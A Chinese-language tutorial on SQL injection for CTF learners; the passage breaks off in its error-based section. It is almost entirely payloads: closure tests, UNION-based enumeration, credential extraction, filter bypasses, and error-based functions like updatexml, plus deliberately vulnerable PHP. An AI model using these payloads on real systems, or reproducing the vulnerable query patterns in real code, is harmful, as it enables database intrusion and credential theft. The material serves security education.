---
title: SQL注入
date: 2026-07-15
categories: [web安全, 常见漏洞]
recommend: 100
type: tech
---

# 1. SQL 注入

SQL注入就是在用户输入里夹带SQL代码，让数据库执行你想要的查询。它是Web安全中最经典的漏洞，也是CTF出题最多的类型。

---

## 1. SQL 注入原理

### 场景

你在登录框输入 `admin' or 1=1 -- `，结果没有密码就登录成功了。或者在 URL 参数 `?id=1` 后面加个单引号，页面报错显示了一堆数据库信息。这就说明存在 SQL 注入。

### 原理

SQL 注入就是后端把用户输入的内容直接拼接进 SQL 语句中，导致用户输入的内容被数据库当成 SQL 代码执行。

**正常情况：**

```sql
select * from tbl_members where id = 1;
```

**恶意输入：**

用户传入 `1 or 1=1`，拼接后：

```sql
select * from tbl_members where id = 1 or 1=1;
```

这里的 `or 1=1` 被数据库当成 SQL 条件执行，返回所有行。

### 实战：一句话理解注入流程

```
用户输入 (payload) → 拼接到 SQL 字符串 → 数据库执行 → 结果返回给用户
                                           ↑
                                   关键点：输入被当成代码执行了
```

### 注入类型速查

| 分类 | 子类 | 特点 |
|------|------|------|
| 按回显方式 | Union 注入 | 有回显位置，直接显示查询结果 |
| | 报错注入 | 无正常回显，但显示报错信息 |
| | 布尔盲注 | 页面真假不同，无数据回显 |
| | 时间盲注 | 页面无差异，靠响应时间判断 |
| 按注入位置 | GET 注入 | 参数在 URL 中 |
| | POST 注入 | 参数在请求体中 |
| | Cookie 注入 | 参数在 Cookie 中 |
| | Header 注入 | 参数在 HTTP 头部 |
| 按数据库类型 | MySQL 注入 | 最经典，CTF 最常见 |
| | SQLite 注入 | 轻量级，常用于文件型数据库 |
| | PostgreSQL 注入 | 功能强，函数多 |
| | SQL Server 注入 | Windows 平台常见 |
| | Oracle 注入 | 企业级，语法特殊 |

### PHP 漏洞代码常见模式

SQL 注入的根本原因是后端将用户输入直接拼接到 SQL 语句中。以下是几种最常见的漏洞模式：

**模式1：GET 参数直接拼接**

```php
<?php
// 数字型注入 - 没有引号包裹
$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = $id";
$result = mysqli_query($conn, $sql);
// 注入：?id=1 UNION SELECT 1,2,3
?>
```

**模式2：字符型参数单引号包裹**

```php
<?php
// 字符型注入 - 有单引号包裹
$name = $_GET['name'];
$sql = "SELECT * FROM products WHERE name = '$name'";
$result = mysqli_query($conn, $sql);
// 注入：?name=admin' OR 1=1 --
?>
```

**模式3：INSERT 注入 - 注册/评论功能**

```php
<?php
$username = $_POST['username'];
$sql = "INSERT INTO users(username, password) VALUES ('$username', '$hashed_pwd')";
$result = mysqli_query($conn, $sql);
// 注入：username = test', password = 'x') --
?>
```

**模式4：UPDATE 注入 - 修改资料**

```php
<?php
$email = $_POST['email'];
$sql = "UPDATE users SET email = '$email' WHERE id = '$uid'";
$result = mysqli_query($conn, $sql);
// 注入：email = x' AND UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 1) --
?>
```

**模式5：DELETE 注入 - 删除操作**

```php
<?php
$id = $_GET['id'];
$sql = "DELETE FROM articles WHERE id = $id";
$result = mysqli_query($conn, $sql);
// 注入：?id=1 OR 1=1 （会删除所有文章！）
?>
```

**模式6：ORDER BY 注入 - 排序功能**

```php
<?php
$sort = $_GET['sort'];
$sql = "SELECT * FROM articles ORDER BY $sort";
$result = mysqli_query($conn, $sql);
// 注入：?sort=1 AND SLEEP(5)
?>
```

**模式7：LIKE 子句注入 - 搜索功能**

```php
<?php
$keyword = $_GET['q'];
$sql = "SELECT * FROM articles WHERE title LIKE '%$keyword%'";
$result = mysqli_query($conn, $sql);
// 注入：?q=%' OR 1=1 --
?>
```

**模式8：LIMIT 子句注入 - 分页功能**

```php
<?php
$limit = $_GET['limit'];
$sql = "SELECT * FROM articles LIMIT $limit";
$result = mysqli_query($conn, $sql);
// 注入：?limit=1 UNION SELECT 1,2,3
?>
```

> **新手避坑：** 刚接触 SQL 注入时，最容易犯的错误是死记硬背 payload 而不理解原理。建议你先在本地搭建一个 SQL 注入靶场（如 DVWA、SQLi-Labs），亲手试一遍各种注入类型，理解每条 payload 的执行效果。

---

## 2. SQL 基础语句

### 2.1 SELECT 查询数据

**场景：**你想从数据库中取数据。

**原理：**`SELECT` 是 SQL 中最基本的查询语句，指定要查的列和来源表。

**实战：**

```sql
-- 查特定字段
select username,phone from tbl_members;

-- 查所有字段
select * from tbl_members;

-- 别名查询
select username as name, password as pwd from tbl_members;

-- 常量查询（调试用）
select 1, 2, 3;

-- 函数查询
select version(), user(), database();
```

### 2.2 WHERE 条件查询

**场景：**只查满足条件的数据。

**原理：**`WHERE` 限制查询范围。

**实战：**

| 条件写法 | 说明 | 示例效果 |
|---------|------|---------|
| `id = 1` | 等于 | 查 id 为 1 的记录 |
| `username = 'admin'` | 字符串等于 | 查用户名为 admin |
| `id > 100` | 大于 | 查 id 大于 100 的记录 |
| `id BETWEEN 1 AND 10` | 范围 | 查 id 1-10 的记录 |
| `username LIKE 'adm%'` | 模糊匹配 | 查以 adm 开头的用户 |
| `username IN ('admin', 'root')` | 集合匹配 | 查指定用户 |

### 2.3 AND 和 OR

**场景：**组合多个条件。

**原理：**`AND` 优先级高于 `OR`。

**实战：**

```sql
-- AND：两个条件都满足
select * from tbl_members where username = 'admin' and status = 1;

-- OR：满足任意一个
select * from tbl_members where username = 'admin' or role = 'superadmin';

-- 组合（AND 优先）
select * from tbl_members where username = 'admin' or role = 'superadmin' and status = 1;
-- 实际：username = 'admin' or (role = 'superadmin' and status = 1)

-- 注入中常用的恒真条件
1 or 1=1
1 or 'a'='a'
1 or true
```

### 2.4 ORDER BY 排序

**场景：**Union 注入前判断列数。

**原理：**`ORDER BY` 可以按列号排序，列号超出范围会报错。

**实战：**

```sql
-- 按列名排序
select * from tbl_members order by id;

-- 按列号排序（注入关键用法）
select * from tbl_members order by 1;
select * from tbl_members order by 2;
select * from tbl_members order by 3;

-- 升序/降序
select * from tbl_members order by id desc;
select * from tbl_members order by create_time asc;
```

**注入用法：**如果 `order by 3` 正常，`order by 4` 报错，说明当前查询有 3 列。

### 2.5 LIMIT 限制数量

**场景：**逐条读取数据。

**原理：**`LIMIT` 限制返回行数，配合偏移量实现分页。

| 写法 | 含义 | 说明 |
|------|------|------|
| `limit 1` | 只取第 1 条 | 等价于 `limit 0,1` |
| `limit 0,1` | 从第 0 条开始取 1 条 | 取第 1 条数据 |
| `limit 1,1` | 从第 1 条开始取 1 条 | 取第 2 条数据 |
| `limit 2,1` | 从第 2 条开始取 1 条 | 取第 3 条数据 |
| `limit 3 offset 0` | 兼容写法 | 同 `limit 0,3` |

### 2.6 UNION 联合查询

**场景：**把自定义查询结果拼接到正常查询结果后面。

**原理：**`UNION` 合并两个 SELECT 的结果，**前后列数必须相同**。

```sql
-- 基本用法
select id, username from tbl_members
union
select 1, 'test';
```

---

## 3. 测试 SQL 注入点

### 场景

你找到一个参数（如 `?id=1`、`?username=admin`），想知道它是否存在 SQL 注入。

### 原理

通过构造永真条件和永假条件，观察页面响应是否不同。如果不同，说明参数进入了 SQL 查询。

### 实战：三步判断法

**第一步：基础测试**

| 测试内容 | Payload | 预期现象 |
|---------|---------|---------|
| 单引号 | `1'` | 报错或页面异常 |
| 永真条件 | `1 and 1=1 -- ` | 页面正常 |
| 永假条件 | `1 and 1=2 -- ` | 页面异常或内容变化 |
| 数字运算 | `1+1` | 页面正常（说明参数被计算） |

**第二步：注释符测试**

```sql
-- 数字型
1 and 1=1 --
1 and 1=2 --

-- 字符型（单引号）
1' and '1'='1' --
1' and '1'='2' --

-- 字符型（双引号）
1" and "1"="1" --
1" and "1"="2" --
```

**第三步：时间延迟测试**

如果页面没有任何差异，尝试时间延迟：

```sql
-- MySQL
1' and sleep(5) --

-- PostgreSQL
1' and pg_sleep(5) --

-- SQL Server
1'; waitfor delay '0:0:5' --
```

如果页面延迟 5 秒才返回，说明存在注入。

> **新手避坑：** 测试时不要把 `and 1=1` 和 `and 1=2` 分开测试！必须成对使用。只看一个条件的结果没有意义，关键是比较两者的差异。另外注意，有些 WAF 会拦截 `or 1=1`，建议优先用 `and`。

---

## 4. 注释符

### 场景

注入 payload 后，原 SQL 语句末尾可能有引号、括号或其他条件需要处理掉。这时就需要注释符。

### 原理

注释符告诉数据库"后面的内容不用管了"，从而让 payload 不受原 SQL 剩余部分的影响。

### 实战：注释符大全

| 注释符 | MySQL | PostgreSQL | SQL Server | SQLite | Oracle | URL 中写法 | 说明 |
|--------|-------|-------------|------------|--------|--------|-----------|------|
| `-- ` | 支持 | 支持 | 支持 | 支持 | 支持 | `--+` 或 `--%20` | 双横线后必须跟空白字符 |
| `#` | 支持 | 不支持 | 不支持 | 不支持 | 不支持 | `%23` | MySQL 专属行内注释 |
| `/* */` | 支持 | 支持 | 支持 | 支持 | 支持 | `%2f%2a` / `%2a%2f` | 块注释，可跨行 |
| `/*! */` | 支持 | 不支持 | 不支持 | 不支持 | 不支持 | 原样 | MySQL 版本注释 |

**关键规则：**

- `--` 在 MySQL 中后面需要空白字符（空格、tab、换页等），URL 中写成 `--+`（`+` 被解析为空格）
- `#` 在 MySQL 中不需要后面跟空白字符，URL 中写成 `%23`
- 块注释 `/* */` 也可用于绕过空格过滤：`select/**/*/**/from/**/tbl_members`

### 注释符的特殊用法

```sql
-- 不用注释符，用恒等条件闭合
-1' union select 1,2,3 where '1'='1

-- 块注释跨输入框闭合
-- 输入框1：admin'/*
-- 输入框2：*/ or 1=1 --

-- 版本注释绕过
-1' /*!union*/ /*!select*/ 1,2,3 --
```

> **新手避坑：** `--` 后面必须有空格！这是 MySQL 的硬性要求。很多新手在 BurpSuite 中直接写 `--` 导致失败。URL 中用 `--+` 是最稳妥的写法。另外注意，`#` 只在 MySQL/MariaDB 中有效，PostgreSQL 和 SQL Server 不认 `#`。

---

## 5. 闭合方式

### 场景

不知道后端 SQL 语句怎么写的时候，需要测试不同的闭合方式来判断单引号、双引号、括号等符号如何与 payload 匹配。

### 原理

后端 SQL 的 WHERE 子句可能有多种写法：

```php
// 数字型
"select * from articles where id = " . $id;

// 单引号字符串
"select * from articles where title = '" . $title . "'";

// 括号包裹
"select * from articles where id = ('" . $id . "')";
```

你需要找出正确的闭合符，让你的 `and 1=1` 成功插入。

### 实战：完整闭合方式表

以下 payload 开头的 `1` 必须保留，它表示原本能够正常查询到数据的参数值。

| 闭合方式 | 测试 payload（成对测试 1=1 / 1=2 对照） |
|---------|----------------------------------------|
| 数字型 | `1 and 1=1 -- ` / `1 and 1=2 -- ` |
| 单引号 | `1' and 1=1 -- ` / `1' and 1=2 -- ` |
| 双引号 | `1" and 1=1 -- ` / `1" and 1=2 -- ` |
| 单括号 | `1) and 1=1 -- ` / `1) and 1=2 -- ` |
| 双括号 | `1)) and 1=1 -- ` / `1)) and 1=2 -- ` |
| 三括号 | `1))) and 1=1 -- ` / `1))) and 1=2 -- ` |
| 单引+单括号 | `1') and 1=1 -- ` / `1') and 1=2 -- ` |
| 双引+单括号 | `1") and 1=1 -- ` / `1") and 1=2 -- ` |
| 单引+双括号 | `1')) and 1=1 -- ` / `1')) and 1=2 -- ` |
| 双引+双括号 | `1")) and 1=1 -- ` / `1")) and 1=2 -- ` |
| 单引+三括号 | `1'))) and 1=1 -- ` / `1'))) and 1=2 -- ` |
| 双引+三括号 | `1"))) and 1=1 -- ` / `1"))) and 1=2 -- ` |
| 花括号（JSON） | `1} and 1=1 -- ` / `1} and 1=2 -- ` |
| LIKE 子句 | `1' and 1=1 and '1' like '1` / ... |
| REGEXP 子句 | `1' and 1=1 and '1' regexp '1` / ... |

### 自动化测试方法

使用 BurpSuite Intruder 爆破闭合方式：

```
1 and 1=1 --
1 and 1=2 --
1' and 1=1 --
1' and 1=2 --
1" and 1=1 --
1" and 1=2 --
1) and 1=1 --
1) and 1=2 --
1') and 1=1 --
1') and 1=2 --
1") and 1=1 --
1") and 1=2 --
1)) and 1=1 --
1)) and 1=2 --
1')) and 1=1 --
1')) and 1=2 --
1")) and 1=1 --
1")) and 1=2 --
```

如果某一组 payload 中，`1=1` 和 `1=2` 的页面结果明显不同，就优先使用这一组闭合方式继续注入。

> **新手避坑：** 闭合方式测试不能只看一个 payload，必须成对测试 `1=1` 和 `1=2`！单独的 `1'` 引起报错可能是真实的 SQL 语法错误，但也可能是程序本身对单引号的异常处理。只有成对比较才有说服力。另外，遇到 JSON 接口时别忘了测试 `1}` 这种花括号闭合。

---

## 6. information_schema（MySQL）

### 场景

你已经确认了注入点，接下来需要查出数据库中有哪些库、哪些表、哪些列，然后提取数据。

### 原理

MySQL 的 `information_schema` 是一个系统数据库，里面保存了所有数据库的元数据——库名、表名、列名等。只要当前用户有读取权限，就能从中获取完整的数据库结构。

### 实战：四步查数据

```sql
-- 1. 查所有数据库名
select group_concat(schema_name) from information_schema.schemata;
-- 输出：information_schema,mysql,performance_schema,test,ctf_db

-- 2. 查指定库的所有表
select group_concat(table_name) from information_schema.tables where table_schema='ctf_db';
-- 输出：articles,users,flags,logs

-- 3. 查指定表的所有列
select group_concat(column_name) from information_schema.columns where table_schema='ctf_db' and table_name='users';
-- 输出：id,username,password,role,email

-- 4. 查数据
select group_concat(username,':',password) from ctf_db.users;
-- 输出：admin:abc123,guest:pass456
```

### 其他数据库的等效查询

| 数据库 | 查表 | 查列 |
|--------|------|------|
| MySQL | `information_schema.tables` | `information_schema.columns` |
| SQLite | `sqlite_master` (type='table') | 从建表语句中解析 |
| PostgreSQL | `information_schema.tables` (table_schema='public') | `information_schema.columns` |
| SQL Server | `sys.tables` 或 `sysobjects` | `sys.columns` |

### 实用技巧

```sql
-- 用十六进制代替引号（绕过引号过滤）
select group_concat(table_name) from information_schema.tables where table_schema=0x6374665f6462;
-- 0x6374665f6462 = 'ctf_db' 的十六进制

-- 当前库的简写
select group_concat(table_name) from information_schema.tables where table_schema=database();

-- 查所有库的表（跨库查询）
select group_concat(table_name) from information_schema.tables where table_schema='mysql';

-- database() 的替代写法
select group_concat(table_name) from information_schema.tables where table_schema=schema();
```

> **新手避坑：** SQLite **没有** `information_schema`，新手常在这里卡住。SQLite 用 `sqlite_master` 查表结构。另外，在 MySQL 中如果当前用户权限不足，`information_schema` 可能只能查到自己有权限的表。

---

## 7. Union 联合查询注入（完整6步流程）

### 场景

页面有数据回显（比如文章列表、用户信息），你可以把自定义查询结果拼接到页面中显示出来。

### 原理

`UNION` 关键字可以把两个 `SELECT` 的结果合并。如果原查询有结果回显，且你能控制 UNION 后面的 SELECT，就能在页面上看到你要的数据。

### 实战：6步完整流程

#### 第1步：判断注入点与闭合方式

```sql
-- 测试单引号闭合
1' and 1=1 --
1' and 1=2 --
```

#### 第2步：判断列数（ORDER BY）

```sql
1' order by 1 --   正常
1' order by 2 --   正常
1' order by 3 --   正常
1' order by 4 --   报错 → 说明有 3 列
```

如果不知道哪个值能查到数据，先让条件为真：

```sql
1' or 1=1 order by 1 --
1' or 1=1 order by 2 --
1' or 1=1 order by 3 --
```

#### 第3步：判断回显位

假设当前查询有 3 列：

```sql
-1' union select 1,2,3 --
```

页面中哪个位置显示了 `1`、`2`、`3`，哪个位置就是回显位。使用 `-1` 是为了让原查询无结果，减少干扰。

#### 第4步：查数据库名

```sql
-- 当前数据库
-1' union select 1,database(),3 --

-- 所有数据库
-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --

-- 逐条查看
-1' union select 1,schema_name,3 from information_schema.schemata limit 0,1 --
-1' union select 1,schema_name,3 from information_schema.schemata limit 1,1 --
```

#### 第5步：查表名和列名

```sql
-- 当前库的所有表
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --

-- 查指定库的表（假设库名为 ctf_db）
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='ctf_db' --

-- 查指定表的列（假设表名为 users）
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' --
```

#### 第6步：查数据

```sql
-- 查单列
-1' union select 1,group_concat(username),3 from users --

-- 查多列
-1' union select 1,group_concat(username,':',password),3 from users --

-- 使用 concat_ws 拼接
-1' union select 1,group_concat(concat_ws('|',username,password,role)),3 from users --
```

### 数值型 Union 注入示例

```sql
-- 列数判断
1 or 1=1 order by 3 --
-- 回显位
-1 union select 1,2,3 --
-- 查数据
-1 union select 1,group_concat(username,':',password),3 from ctf_db.users --
```

### 常见注意点

| 注意点 | 说明 |
|--------|------|
| 列数必须一致 | `union select` 前后的列数必须相同 |
| 必须有回显位 | 页面必须有位置显示查询结果 |
| 用负值或 and 1=2 让原查询为空 | `-1'` 或 `1' and 1=2` |
| 结果太长用 group_concat | 多行合并为一行 |
| 或用 limit 逐条显示 | `limit 0,1`、`limit 1,1` |
| URL 中注释符写法 | `--+` 代替 `-- `，`%23` 代替 `#` |

### 不同闭合方式的 Union 注入示例

**双引号闭合：**

```sql
-1" union select 1,2,3 --
-1" union select 1,database(),3 --
-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --
```

**括号闭合：**

```sql
-1) union select 1,2,3 --
-1) union select 1,database(),3 --
-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --
```

**单引号+括号闭合：**

```sql
-1') union select 1,2,3 --
-1') union select 1,database(),3 --
-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --
```

**无引号数字型闭合：**

```sql
-1 union select 1,2,3 --
-1 union select 1,database(),3 --
-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --
```

### 多表联合查询技巧

有时需要在同一个 payload 中查询多个表的数据：

```sql
-- 同时查用户表和 flag 表
-1' union select 1,group_concat(username,':',password),group_concat(flag_value) from users,flag --

-- 使用子查询查另一个表
-1' union select 1,(select group_concat(flag_value) from flag),3 --

-- 使用笛卡尔积查两个表（谨慎使用）
-1' union select 1,concat_ws('|',t1.username,t2.flag_value),3 from users t1,flag t2 --
```

### 已知表名、列名时的快捷查询

如果从其他途径（如源码泄露、备份文件）已经知道了表名列名，可以直接查数据，绕过 information_schema：

```sql
-- 已知表名 articles，列名 title, content
-1' union select 1,group_concat(title),group_concat(content) from articles --

-- 已知表名 admin_users
-1' union select 1,group_concat(concat_ws(':',username,password)),3 from admin_users --

-- 跨库查询（已知数据库名 other_db）
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='other_db' --
```

> **新手避坑：** 第3步（判断回显位）是最容易出错的环节。如果你用 `-1' union select 1,2,3 -- ` 页面上还是没有数字出现，可能是：原查询没用到你的参数值、闭合方式不对、或者列数判断错了。试试 `' union select 1,2,3 -- `（不加前导数字）或者换个闭合方式。

> **进阶技巧：** 如果页面只显示一行结果而你用了 `group_concat` 可能看不到所有数据，因为有些框架会截断超长字符串。解决办法：1) 用 `SUBSTR` 分段读取；2) 用 `LIMIT 0,1` 逐行读；3) 减少查询字段只查最关键的列。

---

## 7.1 Union注入高级变体

掌握了基础的 Union 注入后，面对更复杂的场景（多字段拼接、跨库查询、逗号被过滤等）时，需要更高级的变体技巧。

### CONCAT_WS 多字段自由组合

当只有一个回显位但需要显示多个字段时，`CONCAT_WS()` 是最佳选择：

```sql
-- 基础：分隔符拼接
-1' UNION SELECT 1, CONCAT_WS('|', emp_name, dept_code, base_salary), 3 FROM employees --

-- 使用十六进制分隔符（避免引号被过滤）
-1' UNION SELECT 1, CONCAT_WS(0x7c, emp_name, dept_code, base_salary), 3 FROM employees --
-- 0x7c = '|'

-- 复杂组合：拼接库名、表名、列名
-1' UNION SELECT 1, CONCAT_WS('::', DATABASE(), TABLE_NAME, COLUMN_NAME), 3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() --
```

### GROUP_CONCAT 分隔符自定义

默认 `GROUP_CONCAT()` 使用逗号分隔，但数据本身可能包含逗号：

```sql
-- 使用自定义分隔符
-1' UNION SELECT 1, GROUP_CONCAT(emp_name SEPARATOR '|'), 3 FROM employees --

-- 结合 CONCAT_WS 实现结构化输出
-1' UNION SELECT 1, GROUP_CONCAT(CONCAT_WS(':', emp_name, base_salary) SEPARATOR ' || '), 3 FROM employees --
-- 输出：alice:5000 || bob:6000 || carol:5500
```

### 跨库查询（CTF 常见）

当 flag 不在当前数据库时，需要跨库查询：

```sql
-- 1. 先查所有数据库名
-1' UNION SELECT 1, GROUP_CONCAT(SCHEMA_NAME), 3 FROM INFORMATION_SCHEMA.SCHEMATA --

-- 2. 查指定库的表（假设库名为 secret_db）
-1' UNION SELECT 1, GROUP_CONCAT(TABLE_NAME), 3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='secret_db' --

-- 3. 查指定库的列
-1' UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME), 3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='secret_db' AND TABLE_NAME='hidden_table' --

-- 4. 跨库查数据（使用 库名.表名 语法）
-1' UNION SELECT 1, GROUP_CONCAT(flag_value), 3 FROM secret_db.hidden_table --

-- 5. 使用十六进制避免引号（secret_db 的十六进制）
-1' UNION SELECT 1, GROUP_CONCAT(flag_value), 3 FROM secret_db.hidden_table WHERE TABLE_SCHEMA=0x7365637265745f6462 --
```

### JSON 数组聚合（MySQL 5.7+）

当 `GROUP_CONCAT()` 被过滤或有长度限制时，可用 JSON 函数替代：

```sql
-- JSON_ARRAYAGG：聚合成 JSON 数组
-1' UNION SELECT 1, JSON_ARRAYAGG(emp_name), 3 FROM employees --
-- 输出：["alice","bob","carol"]

-- JSON_OBJECTAGG：聚合成 JSON 对象（键值对）
-1' UNION SELECT 1, JSON_OBJECTAGG(emp_name, base_salary), 3 FROM employees --
-- 输出：{"alice":5000,"bob":6000,"carol":5500}
```

### 派生表与 JOIN（逗号被过滤时的 Union）

当逗号被过滤时，无法直接写 `UNION SELECT 1,2,3`，可以用派生表 + JOIN：

```sql
-- MySQL：JOIN 写法
-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT DATABASE())b JOIN (SELECT 3)c --

-- 查数据版
-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT GROUP_CONCAT(emp_name) FROM employees)b JOIN (SELECT 3)c --

-- PostgreSQL：CROSS JOIN 写法
-1' UNION SELECT * FROM (SELECT 1)a CROSS JOIN (SELECT CURRENT_DATABASE())b CROSS JOIN (SELECT 3)c --
```

### 子查询嵌套（多级查询）

当页面的 SQL 本身已经是子查询时，需要多层嵌套：

```sql
-- 原 SQL：SELECT * FROM (SELECT id, name FROM employees) AS tmp WHERE id = 输入
-- 注入时需额外闭合一层括号
1') UNION SELECT 1, GROUP_CONCAT(flag_value) FROM secret_db.hidden_table --
```

### Union注入 + 系统变量

```sql
-- 查系统变量
-1' UNION SELECT 1, @@VERSION, @@HOSTNAME --
-1' UNION SELECT 1, @@BASEDIR, @@DATADIR --

-- 查文件路径相关
-1' UNION SELECT 1, @@PLUGIN_DIR, @@CHARACTER_SET_DATABASE --

-- 查数据库配置
-1' UNION SELECT 1, @@MAX_ALLOWED_PACKET, @@GROUP_CONCAT_MAX_LEN --
```

### Union 与 LIMIT 配合

```sql
-- 使用 LIMIT 跳过前 N 行（原查询结果已存在时）
-1' UNION SELECT 1, flag_value, 3 FROM secret_db.hidden_table LIMIT 1,1 --

-- OFFSET 语法（逗号被过滤时）
-1' UNION SELECT 1, flag_value, 3 FROM secret_db.hidden_table LIMIT 1 OFFSET 0 --
```

### Union 注入变体速查表

| 变体类型 | 关键语法 | 适用场景 |
|---------|---------|---------|
| CONCAT_WS 拼接 | `CONCAT_WS('|', col1, col2)` | 单回显位多字段 |
| GROUP_CONCAT 分隔 | `GROUP_CONCAT(col SEPARATOR '|')` | 数据含逗号 |
| 跨库查询 | `库名.表名` | flag 在其他库 |
| JSON 聚合 | `JSON_ARRAYAGG(col)` | GROUP_CONCAT 被过滤 |
| 派生表 JOIN | `SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` | 逗号被过滤 |
| 系统变量 | `@@VERSION`, `@@DATADIR` | 信息收集 |
| LIMIT OFFSET | `LIMIT 1 OFFSET 0` | 逗号被过滤 |
| 十六进制表名 | `WHERE TABLE_NAME=0x7573657273` | 引号被过滤 |

> **新手避坑：** 跨库查询的前提是当前数据库用户有权限访问其他数据库。如果 `INFORMATION_SCHEMA.SCHEMATA` 只能查到部分库，说明权限受限。此时可以尝试 `SELECT USER()` 查看当前用户，然后在 `mysql.db` 表中查看权限分配。另外，`JSON_ARRAYAGG()` 在 MySQL 5.7+ 才可用，低版本会报错。

---

## 8. 报错注入

### 场景

页面没有正常的数据回显位置，但是当 SQL 出错时，**报错信息会直接显示在页面上**。你可以在报错信息中夹带查询结果。

### 原理

让数据库执行一个必然报错的函数调用，同时把你想取的数据作为参数的一部分拼进去。报错信息会把函数参数的内容输出出来。

### 实战：三大报错注入函数

#### 8.1 updatexml() 报错

**适用：**MySQL 5.x

```sql
-- 基本格式
1' and updatexml(1,concat(0x7e,(查询语句),0x7e),1) --

-- 查当前数据库
1' and updatexml(1,concat(0x7e,database(),0x7e),1) --
-- 报错：XPATH syntax error: '~ctf_db~'

-- 查所有数据库
1' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1) --

-- 查当前库的表
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --

-- 查指定表的列
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) --

-- 查数据
1' and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) --
```

#### 8.2 extractvalue() 报错

**适用：**MySQL 5.x，用法与 updatexml 类似

```sql
-- 基本格式
1' and extractvalue(1,concat(0x7e,(查询语句),0x7e)) --

-- 查版本
1' and extractvalue(1,concat(0x7e,version(),0x7e)) --

-- 查用户
1' and extractvalue(1,concat(0x7e,user(),0x7e)) --

-- 查当前数据库
1' and extractvalue(1,concat(0x7e,database(),0x7e)) --
```

#### 8.3 floor(rand()) 报错

**适用：**MySQL 5.x，利用 GROUP BY 的重复键冲突

```sql
-- 基本格式
1' and (select 1 from (select count(*),concat(0x7e,(查询语句),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a) --

-- 查当前数据库
1' and (select 1 from (select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a) --

-- 查表名
1' and (select 1 from (select count(*),concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a) --
```

### 报错长度限制与分段

`updatexml` 和 `extractvalue` 的输出长度限制约为 32 个字符。数据太长需要分段：

```sql
-- 用 substr 截取前 30 个字符
1' and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,30),0x7e),1) --

-- 截取第 31-60 个字符
1' and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),31,30),0x7e),1) --

-- 配合 limit 逐行读取
1' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --
1' and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) --
```

### 三大函数对比

| 函数 | 限制长度 | 写法复杂度 | 适用版本 | 特点 |
|------|---------|-----------|---------|------|
| `updatexml()` | 约 32 字符 | 中等 | MySQL 5.x | 最常用，容易构造 |
| `extractvalue()` | 约 32 字符 | 简单 | MySQL 5.x | 比 updatexml 少一个参数 |
| `floor(rand())` | 较长 | 复杂 | MySQL 5.x | 没有长度限制问题 |

> **新手避坑：** `updatexml` 和 `extractvalue` 在现代 MySQL 8.x 中可能已经被移除或功能受限。如果你在 MySQL 8.x 上遇到"Function does not exist"的报错，说明该函数不可用，这时可以考虑 `floor(rand())` 或其他注入方式。另外，报错信息长度有限，读长数据一定要 `substr` 分段。

> **新手避坑：** 报错注入虽然比盲注快，但有长度限制。每次报错最多显示约 32 个字符。实际运用中，先用 `LIMIT` 逐行读数据，每行再用 `SUBSTR()` 分 30 字符一段。如果一个 flag 有 48 位，你需要至少发 2 次请求才能读完。记住：`substr(data, 1, 30)` 读前 30 位，`substr(data, 31, 30)` 读后 18 位。

### 8.4 更多 MySQL 报错注入函数

除了三大经典报错函数（`updatexml`、`extractvalue`、`floor(rand())`），MySQL 中还有一些较少使用但同样有效的报错函数：

#### EXP(~) 溢出报错

利用 `EXP()` 指数函数在参数过大时产生溢出错误：

```sql
-- 基本格式
1' AND EXP(~(SELECT * FROM (SELECT DATABASE()) a)) --

-- 查表名
1' AND EXP(~(SELECT * FROM (SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()) a)) --

-- 数值型
1 AND EXP(~(SELECT DATABASE())) --
```

报错信息示例：`DOUBLE value is out of range in 'exp(~((select 'ctf_db') from dual))'`

#### GTID_SUBSET 报错（MySQL 5.6+）

需要 `GTID` 功能开启，特定版本中可用：

```sql
1' AND GTID_SUBSET(CONCAT(0x7e, DATABASE(), 0x7e), 1) --
1' AND GTID_SUBSET(CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()), 0x7e), 1) --
```

#### NAME_CONST 报错（MySQL 5.0+）

```sql
1' AND NAME_CONST(DATABASE(), 1) --
1' AND NAME_CONST((SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()), 1) --
```

报错示例：`Duplicate column name 'ctf_db'`

#### 几何函数报错

利用空间几何函数的参数校验畸变产生报错：

```sql
-- MultiPoint 报错
1' AND MULTIPOINT(CONCAT(0x7e, DATABASE(), 0x7e)) --

-- GeometryCollection 报错
